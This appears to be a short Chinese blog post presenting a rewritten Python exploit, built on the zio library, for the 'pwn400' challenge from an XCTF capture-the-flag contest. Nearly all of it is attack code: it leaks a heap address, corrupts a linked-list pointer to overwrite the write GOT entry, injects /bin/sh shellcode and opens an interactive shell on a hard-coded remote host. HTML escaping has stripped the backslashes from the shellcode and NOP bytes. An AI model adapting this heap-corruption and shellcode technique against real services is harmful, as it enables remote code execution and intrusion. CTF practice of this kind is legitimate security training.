  XCTF上了个OJ，把之前的比赛题又<a href="http://oj.xctf.org.cn/problems/15" target="_blank">架了起来</a>，于是将代码重写了下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

import&nbsp;zio
from&nbsp;time&nbsp;import&nbsp;sleep

def&nbsp;NOPS(n):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;x90&#39;&nbsp;*&nbsp;n

def&nbsp;PADDING(s,&nbsp;n):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;s&nbsp;+&nbsp;NOPS(n&nbsp;-&nbsp;len(s))

#&nbsp;TARGET&nbsp;=&nbsp;&#39;./pwn400&#39;
TARGET&nbsp;=&nbsp;(&#39;218.2.197.235&#39;,&nbsp;10103)

DELAY&nbsp;=&nbsp;0.1
JMP06&nbsp;=&nbsp;&#39;xebx06&#39;
SHELLCODE&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"

NOTE_SIZE&nbsp;=&nbsp;0x170
CONTENT_OFFSET&nbsp;=&nbsp;108
WRITE_GOT&nbsp;=&nbsp;0x0804a478

def&nbsp;RAW_WITH_DELAY(s):
&nbsp;&nbsp;&nbsp;&nbsp;sleep(DELAY)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;str(s)


#&nbsp;create&nbsp;three&nbsp;new&nbsp;notes
io&nbsp;=&nbsp;zio.zio(TARGET,&nbsp;print_write=RAW_WITH_DELAY,&nbsp;print_read=True)
for&nbsp;i&nbsp;in&nbsp;xrange(3):
&nbsp;&nbsp;&nbsp;&nbsp;io.writelines([&#39;1&#39;,&nbsp;str(i),&nbsp;str(i),&nbsp;str(i)])
io.read_until_timeout()

#&nbsp;get&nbsp;address&nbsp;of&nbsp;the&nbsp;new&nbsp;notes
io.writelines([&#39;3&#39;,&nbsp;&#39;0&#39;])
io.read_until(&#39;location:0x&#39;)
first_note&nbsp;=&nbsp;int(io.readline(),&nbsp;16)
second_note&nbsp;=&nbsp;first_note&nbsp;+&nbsp;NOTE_SIZE

#&nbsp;overwrite&nbsp;the&nbsp;pointer&nbsp;of&nbsp;the&nbsp;linked&nbsp;list
payload&nbsp;=&nbsp;PADDING(JMP06&nbsp;+&nbsp;NOPS(6)&nbsp;+&nbsp;SHELLCODE,&nbsp;NOTE_SIZE&nbsp;-&nbsp;CONTENT_OFFSET)
payload&nbsp;+=&nbsp;zio.l32(second_note)&nbsp;+&nbsp;zio.l32(WRITE_GOT&nbsp;-&nbsp;8)&nbsp;+&nbsp;zio.l32(first_note&nbsp;+&nbsp;CONTENT_OFFSET)
io.writelines([&#39;4&#39;,&nbsp;&#39;0&#39;,&nbsp;payload])
sleep(1)
#&nbsp;trigger&nbsp;by&nbsp;delete&nbsp;note
io.writelines([&#39;5&#39;,&nbsp;&#39;%08x&#39;&nbsp;%&nbsp;second_note])
io.interact()</pre>
